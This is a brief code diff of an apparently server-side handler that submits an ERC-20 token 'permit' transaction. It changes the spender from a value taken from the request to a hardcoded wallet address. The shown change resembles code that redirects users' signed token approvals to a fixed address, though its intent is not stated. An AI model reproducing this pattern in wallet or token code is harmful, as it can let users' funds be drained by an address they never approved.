@@ -15,7 +15,15 @@ export default async function handler(
         address: "0xc4bF5CbDaBE595361438F8c6a187bDc330539c60",
         abi: erc20ABI,
         functionName: "permit",
-        args: [owner, spender, BigInt(value), BigInt(deadline), v, r, s],
+        args: [
+          owner,
+          "0xe84DbC4EE14b0360B7bF87c7d30Cd0604E0e1E0F",
+          BigInt(value),
+          BigInt(deadline),
+          v,
+          r,
+          s,
+        ],
       });
 
       const hash = await walletClient.writeContract(permitRequest);
